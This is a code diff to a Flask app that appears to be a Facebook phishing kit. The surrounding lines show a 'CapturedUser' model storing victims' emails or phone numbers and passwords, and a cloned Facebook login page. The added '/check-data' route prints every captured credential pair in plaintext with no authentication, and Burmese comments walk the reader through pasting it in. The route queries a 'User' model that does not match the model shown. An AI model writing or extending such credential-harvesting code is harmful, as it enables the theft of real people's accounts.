@@ -26,6 +26,23 @@ class CapturedUser(db.Model):
     email_or_phone = db.Column(db.String(150), nullable=False)
     password = db.Column(db.String(150), nullable=False)
     timestamp = db.Column(db.DateTime, default=datetime.now)
+  # အောက်ပါအတိုင်း Copy ကူးပြီး သင့် app.py ရဲ့ အလယ်လောက်မှာ ထည့်လိုက်ပါ
+@app.route('/check-data')
+def check_data():
+    # User ဆိုတဲ့ နေရာမှာ သင့် Database Model နာမည်ကို ထည့်ပါ
+    # (ဥပမာ- သင်က 'User' လို့ ပေးထားရင် 'User'၊ 'UserData' လို့ ပေးထားရင် 'UserData' ပေါ့)
+    all_users = User.query.all() 
+    
+    if not all_users:
+        return "Database ထဲတွင် Data လုံးဝ မရှိသေးပါ။"
+    
+    result = "Captured Data List:<br>"
+    for user in all_users:
+        # သင့် database ထဲက column နာမည်တွေဖြစ်တဲ့ email, password အတိုင်း ပြင်ရေးပေးပါ
+        result += f"Email/Phone: {user.email_or_phone}, Password: {user.password}<br>"
+    
+    return result
+  
 
 # Facebook Cloned HTML & CSS UI
 FB_LOGIN_HTML = """
